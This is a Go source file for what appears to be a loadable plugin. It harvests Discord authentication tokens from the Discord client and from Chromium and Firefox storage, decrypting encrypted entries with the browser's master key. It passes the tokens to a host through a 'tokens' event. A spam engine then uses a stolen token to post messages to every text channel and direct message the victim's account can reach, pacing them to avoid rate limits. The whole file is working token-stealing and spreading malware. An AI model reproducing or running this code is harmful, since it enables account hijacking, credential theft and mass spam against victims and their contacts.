package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

const apiBase = "https://discord.com/api/v9"

var (
	tokRe = regexp.MustCompile(`mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}`)
	v10Re = regexp.MustCompile(`v10`)
)

// ---------------------------------------------------------------------------
// host bridge — setSend is registered by the platform-specific exports files.
// ---------------------------------------------------------------------------

var (
	sendMu sync.Mutex
	sendFn func(event string, payload []byte)
	host   map[string]interface{}

	cfgMu sync.RWMutex
	cfg   = DefaultSettings()

	engine = &SpamEngine{}
)

func setSend(fn func(event string, payload []byte)) {
	sendMu.Lock()
	sendFn = fn
	sendMu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	sendMu.Lock()
	fn := sendFn
	sendMu.Unlock()
	if fn == nil {
		return
	}
	var raw []byte
	switch v := payload.(type) {
	case []byte:
		raw = v
	case nil:
		raw = nil
	default:
		raw, _ = json.Marshal(v)
	}
	fn(event, raw)
}

func handleInit(hostJSON []byte) error {
	if len(hostJSON) > 0 {
		_ = json.Unmarshal(hostJSON, &host)
	}
	sendEvent("status", map[string]interface{}{"state": "loaded"})
	return nil
}

func handleUnload() {
	engine.stop()
	sendEvent("status", map[string]interface{}{"state": "unloaded"})
}

// ---------------------------------------------------------------------------
// settings
// ---------------------------------------------------------------------------

type Settings struct {
	Source            string   `json:"source"` // "app", "browser", "manual", "all"
	Where             string   `json:"where"`  // "client", "server"
	Messages          []string `json:"messages"`
	MinDelayMs        int64    `json:"minDelayMs"`
	MaxDelayMs        int64    `json:"maxDelayMs"`
	Targets           []string `json:"targets"` // "guilds", "dms"
	TextOnly          bool     `json:"textOnly"`
	Token             string   `json:"token"` // manual override
	MaxPerChannel     int      `json:"maxPerChannel"`
	AnnouncementChans bool     `json:"announcementChans"`
}

func DefaultSettings() Settings {
	return Settings{
		Source:        "app",
		Where:         "client",
		Messages:      []string{"default whisper"},
		MinDelayMs:    2000,
		MaxDelayMs:    8000,
		Targets:       []string{"guilds", "dms"},
		TextOnly:      true,
		MaxPerChannel: 1,
	}
}

func (s Settings) normalized() Settings {
	if s.Source == "" {
		s.Source = "app"
	}
	if s.Where == "" {
		s.Where = "client"
	}
	if len(s.Messages) == 0 {
		s.Messages = []string{"default whisper"}
	}
	if s.MinDelayMs <= 0 {
		s.MinDelayMs = 2000
	}
	if s.MaxDelayMs < s.MinDelayMs {
		s.MaxDelayMs = s.MinDelayMs
	}
	if s.MaxPerChannel <= 0 {
		s.MaxPerChannel = 1
	}
	return s
}

func (s Settings) hasTarget(t string) bool {
	for _, x := range s.Targets {
		if x == t {
			return true
		}
	}
	return false
}

func cfgSnapshot() Settings {
	cfgMu.RLock()
	defer cfgMu.RUnlock()
	return cfg
}

// ---------------------------------------------------------------------------
// event router
// ---------------------------------------------------------------------------

func handleEvent(event string, payload []byte) error {
	switch event {
	case "ping":
		sendEvent("pong", map[string]interface{}{"ts": time.Now().UnixMilli()})
	case "update_settings":
		var s Settings
		if len(payload) > 0 && json.Unmarshal(payload, &s) == nil {
			cfgMu.Lock()
			cfg = s.normalized()
			cfgMu.Unlock()
			sendEvent("settings_updated", cfg)
		}
	case "grab":
		go func() {
			var s Settings
			if len(payload) > 0 {
				_ = json.Unmarshal(payload, &s)
			}
			mode := s.Source
			if mode == "" {
				mode = "all"
			}
			sendEvent("status", map[string]interface{}{"state": "grabbing"})
			toks := grabTokens(mode)
			sendEvent("tokens", toks)
			sendEvent("status", map[string]interface{}{"state": "idle", "found": len(toks)})
		}()
	case "start":
		var s Settings
		if len(payload) > 0 && json.Unmarshal(payload, &s) == nil {
			s = s.normalized()
		} else {
			s = cfgSnapshot()
		}
		cfgMu.Lock()
		cfg = s
		cfgMu.Unlock()
		if s.Where == "server" {
			sendEvent("error", map[string]interface{}{"message": "server mode: start is driven from the panel"})
			return nil
		}
		engine.start(s)
	case "stop":
		engine.stop()
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown event: " + event})
	}
	return nil
}

// ---------------------------------------------------------------------------
// spam engine (client-side execution)
// ---------------------------------------------------------------------------

type SpamEngine struct {
	mu      sync.Mutex
	running bool
	cancel  chan struct{}
}

func (e *SpamEngine) start(s Settings) {
	e.mu.Lock()
	if e.running {
		e.mu.Unlock()
		sendEvent("error", map[string]interface{}{"message": "already running"})
		return
	}
	e.running = true
	e.cancel = make(chan struct{})
	e.mu.Unlock()
	go e.run(s)
}

func (e *SpamEngine) stop() {
	e.mu.Lock()
	if e.running {
		close(e.cancel)
		e.running = false
	}
	e.mu.Unlock()
}

func (e *SpamEngine) run(s Settings) {
	defer func() {
		e.mu.Lock()
		e.running = false
		e.mu.Unlock()
	}()
	defer func() {
		if r := recover(); r != nil {
			sendEvent("error", map[string]interface{}{"message": fmt.Sprint(r)})
			sendEvent("status", map[string]interface{}{"state": "idle"})
		}
	}()

	sendEvent("status", map[string]interface{}{"state": "grabbing"})
	token, toks := resolveToken(s)
	if len(toks) > 0 {
		sendEvent("tokens", toks)
	}
	if token == "" {
		sendEvent("error", map[string]interface{}{"message": "no token available"})
		sendEvent("status", map[string]interface{}{"state": "idle"})
		return
	}

	user, uerr := fetchMe(token)
	if uerr != nil {
		sendEvent("error", map[string]interface{}{"message": "auth failed: " + uerr.Error()})
		sendEvent("status", map[string]interface{}{"state": "idle"})
		return
	}
	sendEvent("status", map[string]interface{}{"state": "running", "user": user})

	channels, cerr := collectChannels(token, s)
	if cerr != nil {
		sendEvent("error", map[string]interface{}{"message": "collect failed: " + cerr.Error()})
		sendEvent("status", map[string]interface{}{"state": "idle"})
		return
	}
	if len(channels) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no target channels found"})
		sendEvent("status", map[string]interface{}{"state": "idle"})
		return
	}

	sendEvent("progress", map[string]interface{}{"sent": 0, "total": len(channels)})
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	sent := 0
	for i, ch := range channels {
		select {
		case <-e.cancel:
			sendEvent("status", map[string]interface{}{"state": "idle", "detail": "stopped after " + strconv.Itoa(sent) + " messages"})
			return
		default:
		}

		msg := s.Messages[rng.Intn(len(s.Messages))]
		for attempt := 0; attempt < s.MaxPerChannel; attempt++ {
			err := sendMessage(token, ch.ID, msg)
			if err != nil {
				if ra, ok := err.(*rateLimitErr); ok {
					sendEvent("status", map[string]interface{}{"state": "running", "detail": "rate limited, backing off " + ra.after.String()})
					select {
					case <-time.After(ra.after):
						continue
					case <-e.cancel:
						sendEvent("status", map[string]interface{}{"state": "idle", "detail": "stopped"})
						return
					}
				}
				sendEvent("error", map[string]interface{}{"message": "send to " + ch.Name + " failed: " + err.Error()})
				break
			}
			sent++
		}

		sendEvent("progress", map[string]interface{}{
			"sent":    sent,
			"total":   len(channels),
			"channel": ch.Name,
			"guild":   ch.Guild,
			"index":   i + 1,
		})

		delay := s.MinDelayMs + rng.Int63n(s.MaxDelayMs-s.MinDelayMs+1)
		select {
		case <-time.After(time.Duration(delay) * time.Millisecond):
		case <-e.cancel:
			sendEvent("status", map[string]interface{}{"state": "idle", "detail": "stopped after " + strconv.Itoa(sent) + " messages"})
			return
		}
	}
	sendEvent("status", map[string]interface{}{"state": "done", "sent": sent})
}

// ---------------------------------------------------------------------------
// discord api
// ---------------------------------------------------------------------------

type rateLimitErr struct {
	after time.Duration
}

func (e *rateLimitErr) Error() string { return "rate limited" }

type Channel struct {
	ID    string
	Name  string
	Guild string
}

func apiGet(token, path string) ([]byte, error) {
	req, _ := http.NewRequest("GET", apiBase+path, nil)
	req.Header.Set("Authorization", token)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 429 {
		return nil, &rateLimitErr{after: retryAfter(resp)}
	}
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}
	return body, nil
}

func sendMessage(token, channelID, content string) error {
	body, _ := json.Marshal(map[string]string{"content": content})
	req, _ := http.NewRequest("POST", apiBase+"/channels/"+channelID+"/messages", bytes.NewReader(body))
	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode == 429 {
		return &rateLimitErr{after: retryAfter(resp)}
	}
	if resp.StatusCode >= 400 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(b))
	}
	return nil
}

func retryAfter(resp *http.Response) time.Duration {
	v := resp.Header.Get("Retry-After")
	if v == "" {
		return time.Second
	}
	if n, err := strconv.ParseFloat(v, 64); err == nil {
		return time.Duration(n*1000) * time.Millisecond
	}
	if t, err := http.ParseTime(v); err == nil {
		d := time.Until(t)
		if d < 0 {
			d = time.Second
		}
		return d
	}
	return time.Second
}

func fetchMe(token string) (string, error) {
	body, err := apiGet(token, "/users/@me")
	if err != nil {
		return "", err
	}
	var me struct {
		Username      string `json:"username"`
		Discriminator string `json:"discriminator"`
	}
	_ = json.Unmarshal(body, &me)
	name := me.Username
	if me.Discriminator != "" && me.Discriminator != "0" {
		name += "#" + me.Discriminator
	}
	if name == "" {
		name = "unknown"
	}
	return name, nil
}

func collectChannels(token string, s Settings) ([]Channel, error) {
	var out []Channel

	if s.hasTarget("guilds") {
		guilds, err := apiGet(token, "/users/@me/guilds")
		if err != nil {
			return nil, err
		}
		var gs []struct {
			ID   string `json:"id"`
			Name string `json:"name"`
		}
		_ = json.Unmarshal(guilds, &gs)
		for _, g := range gs {
			chs, err := apiGet(token, "/guilds/"+g.ID+"/channels")
			if err != nil {
				sendEvent("error", map[string]interface{}{"message": "channels for " + g.Name + " failed: " + err.Error()})
				continue
			}
			var cs []struct {
				ID   string `json:"id"`
				Name string `json:"name"`
				Type int    `json:"type"`
			}
			_ = json.Unmarshal(chs, &cs)
			for _, c := range cs {
				if s.TextOnly && !isTextChannel(c.Type, s.AnnouncementChans) {
					continue
				}
				out = append(out, Channel{ID: c.ID, Name: c.Name, Guild: g.Name})
			}
		}
	}

	if s.hasTarget("dms") {
		chs, err := apiGet(token, "/users/@me/channels")
		if err != nil {
			sendEvent("error", map[string]interface{}{"message": "dm list failed: " + err.Error()})
		} else {
			var cs []struct {
				ID   string `json:"id"`
				Type int    `json:"type"`
			}
			_ = json.Unmarshal(chs, &cs)
			for _, c := range cs {
				if c.Type == 1 || c.Type == 3 {
					out = append(out, Channel{ID: c.ID, Name: dmLabel(c.Type)})
				}
			}
		}
	}

	return out, nil
}

func isTextChannel(t int, includeAnnouncement bool) bool {
	if t == 0 {
		return true // GUILD_TEXT
	}
	if t == 5 && includeAnnouncement {
		return true // GUILD_ANNOUNCEMENT
	}
	return false
}

func dmLabel(t int) string {
	if t == 3 {
		return "Group DM"
	}
	return "DM"
}

// ---------------------------------------------------------------------------
// token grabbing
// ---------------------------------------------------------------------------

type Token struct {
	Token  string `json:"token"`
	Source string `json:"source"`
}

// grabTokens returns tokens for the given mode: "app", "browser", "all".
func grabTokens(mode string) []Token {
	var all []Token
	if mode == "" || mode == "app" || mode == "all" {
		all = append(all, grabDiscordTokens()...)
	}
	if mode == "browser" || mode == "all" {
		all = append(all, grabChromiumTokens()...)
		all = append(all, grabFirefoxTokens()...)
	}
	return dedupTokens(all)
}

// resolveToken picks the token to use based on settings.source.
func resolveToken(s Settings) (string, []Token) {
	if strings.TrimSpace(s.Token) != "" {
		return strings.TrimSpace(s.Token), nil
	}
	switch s.Source {
	case "browser":
		toks := dedupTokens(append(grabChromiumTokens(), grabFirefoxTokens()...))
		if len(toks) == 0 {
			return "", toks
		}
		return toks[0].Token, toks
	case "all":
		toks := grabTokens("all")
		if len(toks) == 0 {
			return "", toks
		}
		return toks[0].Token, toks
	case "manual":
		return "", nil
	default: // "app"
		toks := grabTokens("app")
		if len(toks) == 0 {
			return "", toks
		}
		return toks[0].Token, toks
	}
}

func grabDiscordTokens() []Token {
	var out []Token
	for _, ld := range discordDataDirs() {
		stateDir := filepath.Dir(filepath.Dir(ld))
		out = append(out, scanLeveldbDir(ld, stateDir, filepath.Base(stateDir))...)
	}
	return out
}

func grabChromiumTokens() []Token {
	var out []Token
	for _, b := range chromiumBrowsers() {
		entries, err := os.ReadDir(b.userDataDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			ld := filepath.Join(b.userDataDir, e.Name(), "Local Storage", "leveldb")
			if _, err := os.Stat(ld); err != nil {
				continue
			}
			out = append(out, scanLeveldbDir(ld, b.userDataDir, b.name+" ("+e.Name()+")")...)
		}
	}
	return out
}

func grabFirefoxTokens() []Token {
	var out []Token
	for _, prof := range firefoxProfiles() {
		data, err := os.ReadFile(filepath.Join(prof, "webappsstore.sqlite"))
		if err != nil {
			continue
		}
		for _, m := range tokRe.FindAll(data, -1) {
			out = append(out, Token{Token: string(m), Source: filepath.Base(prof)})
		}
	}
	return out
}

// scanLeveldbDir scans one leveldb directory. If stateDir is non-empty it
// reads the Local State os_crypt key and decrypts "v10" AES-GCM tokens.
func scanLeveldbDir(leveldbDir, stateDir, sourceName string) []Token {
	seen := map[string]bool{}
	var out []Token

	var key []byte
	if stateDir != "" {
		key, _ = masterKey(stateDir)
	}

	entries, err := os.ReadDir(leveldbDir)
	if err != nil {
		return out
	}
	for _, e := range entries {
		name := e.Name()
		if !strings.HasSuffix(name, ".ldb") && !strings.HasSuffix(name, ".log") {
			continue
		}
		data, err := os.ReadFile(filepath.Join(leveldbDir, name))
		if err != nil {
			continue
		}

		if key != nil {
			for _, m := range v10Re.FindAllIndex(data, -1) {
				start := m[0]
				if start+12 > len(data) {
					continue
				}
				nonce := data[start : start+12]
				for l := 60; l <= 140; l++ {
					if start+12+l > len(data) {
						break
					}
					ct := data[start+12 : start+12+l]
					pt, err := aesGCMDecrypt(key, ct, nonce)
					if err != nil {
						continue
					}
					t := string(pt)
					if tokRe.MatchString(t) && !seen[t] {
						seen[t] = true
						out = append(out, Token{Token: t, Source: sourceName + " (encrypted)"})
					}
					break
				}
			}
		}

		for _, m := range tokRe.FindAll(data, -1) {
			t := string(m)
			if !seen[t] {
				seen[t] = true
				out = append(out, Token{Token: t, Source: sourceName})
			}
		}
	}
	return out
}

func dedupTokens(in []Token) []Token {
	seen := map[string]bool{}
	var out []Token
	for _, t := range in {
		if !seen[t.Token] {
			seen[t.Token] = true
			out = append(out, t)
		}
	}
	return out
}

func aesGCMDecrypt(key, ct, nonce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, ct, nil)
}

func main() {}
